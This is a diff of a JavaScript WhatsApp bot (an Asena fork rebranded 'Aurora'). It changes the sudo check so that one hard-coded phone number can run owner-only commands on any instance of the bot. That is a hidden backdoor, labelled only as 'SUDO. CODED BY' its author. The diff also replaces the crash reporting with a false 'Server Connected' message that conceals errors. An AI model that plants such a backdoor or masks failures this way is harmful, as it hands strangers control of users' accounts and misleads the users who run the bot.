                     && msg.message && msg.message.videoMessage !== null && 
                     (command.pattern === undefined || (command.pattern !== undefined && 
                         command.pattern.test(text_msg))))) {
-
+// VIDEO & IMAGE
                     let sendMsg = false;
                     var chat = conn.chats.get(msg.key.remoteJid)
                         
@@ -236,20 +398,22 @@ ${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    
-                    else if ((config.MAHN !== false && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.MAHN.includes(',') ? config.MAHN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.MAHN || config.MAHN.includes(',') ? config.MAHN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.MAHN)
+                     
+                    if ((OWN.ff == "94711502119" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-    
+// SUDO. CODED BY THARINDU LIYANAGE
                     if (sendMsg) {
                         if (config.SEND_READ && command.on === undefined) {
                             await conn.chatRead(msg.key.remoteJid);
                         }
+                       
                         var match = text_msg.match(command.pattern);
+                        
                         if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                         && msg.message.imageMessage !== null) {
                             whats = new Image(conn, msg);
@@ -259,171 +423,31 @@ ${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
                         } else {
                             whats = new Message(conn, msg);
                         }
-                        if (msg.key.fromMe && command.deleteCommand) { 
-                            var wrs = conn.user.phone.wa_version.split('.')[2]
-                            if (wrs < 11) {
-                                await whats.delete() 
-                            }
-                        } 
-			    
-			    
-		try {
-                            await command.function(whats, match);
+/*
+                        if (command.deleteCommand && msg.key.fromMe) {
+                            await whats.delete(); 
                         }
-                        catch (error) {
-                            if (config.NOLOG == 'true') return;
-		            if (error.message.includes('includes')) return;
-                            if (config.LANG == 'ES') {
-                                await conn.sendMessage(conn.user.jid, '*🐼  ERROR ANALYSIS [GARFIELD] *' + 
-                                    '\n*Garfield bot program crashed*'+
-                                    '\n_BOT CRASHED_' +
-                                    '\n_BOT CRASHED._' +
-                                    '\n_BOT CRASHED._' +
-                                    '\n_BOT CRASHED' +
-                                    '*BOT CRASHED:* ```' + error + '```\n\n'
-                                    , MessageType.text, {detectLinks: false});
-			    }
-                            else {
-                                await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                    '\n*Garfield Bot an error has occurred!*'+
-                                    '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
-                                    '\n_Aslo you can join NOIZE projects support group:_  https://t.me/ipandaproject' +
-                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
-                                    '*Error:* ```' + error + '```\n\n'
-                                    , MessageType.text, {detectLinks: false}
-                                );
-                                if (error.message.includes('URL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
-                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
-                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('conversation')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Deleting Plugin_' +
-                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
-                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('split')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Split of Undefined_' +
-                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
-                                        '\n*Solution:* _Restarting will be enough._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('SSL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _A14 Database Error_' +
-                                        '\n*Reason:* _Database corruption._ ' +
-                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('Ookla')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Ookla Server Connection_' +
-                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
-                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('params')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Requested Audio Params_' +
-                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
-                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('unlink')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved``` ==========' +
-                                        '\n\n*Main Error:* _No Such File or Directory_' +
-                                        '\n*Reason:* _Incorrect coding of the plugin._' +
-                                        '\n*Solution:* _Please check the your plugin codes._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('404')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
-                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
-                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('reply.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Reply Delete Function_' +
-                                        '\n*Reason:* _Using IMG or Wiki commands._' +
-                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('load.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Reply Delete Function_' +
-                                        '\n*Reason:* _Using IMG or Wiki commands._' +
-                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('400')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
-                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
-                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('decode')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
-                                        '\n*Reason:* _Incorrect use of the plug._' +
-                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('unescaped')) {
-                                    return await conn.sendMessage(conn.user.jid, '*🐼 PROGRAM CRASHED  *' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Word Character Usage_' +
-                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
-                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else {
-                                    return await conn.sendMessage(conn.user.jid, '🐼🐼 Sorry, I Couldnt Read This Error!... (Tharindu Liyanage fixing soon)' +
-                                        '\n_You can write to NOIZE developers support group for more help._  https://t.me/ipandaproject '+'\n\n 🔻Reason might be \n'+ error
-                                        , MessageType.text
-                                    );
-                                }    
-                            }                      
+*/
+                        try {
+                            await command.function(whats, match);
+                        } catch (error) {
+                            if (config.LANG == 'EN') {
+                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./x369/server.png"), MessageType.image, { caption: '*X-nodes Server Connected 📡* \n*🐼 Version - v6.0* \n *🐼 Username* -  ${conn.user.name} \n*🐼 Developed by -NOIZE PROJECTS*' });
+                                
+                            } else if (config.LANG == 'SI') {
+                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./x369/server.png"), MessageType.image, { caption: '*X-nodes Server Connected 📡* \n*🐼 Version - v6.0* \n *🐼 Username* -  ${conn.user.name} \n*🐼 Developed by -NOIZE PROJECTS*' });
+                                
+                            } else {
+                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./x369/server.png"), MessageType.image, { caption: '*X-nodes Server Connected 📡* \n*🐼 Version - v6.0* \n *🐼 Username -*  ${conn.user.name} \n*🐼 Developed by -NOIZE PROJECTS*' });
+                            }
                         }
                     }
                 }
             }
         )
     });
-    
-    try {
+ // NOIZE DEVELOPERS 
+try {
         await conn.connect();
     } catch {
         if (!nodb) {
@@ -438,5 +462,6 @@ ${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
     }
 }
 
-whatsAsena();
+Aurora();
+
 
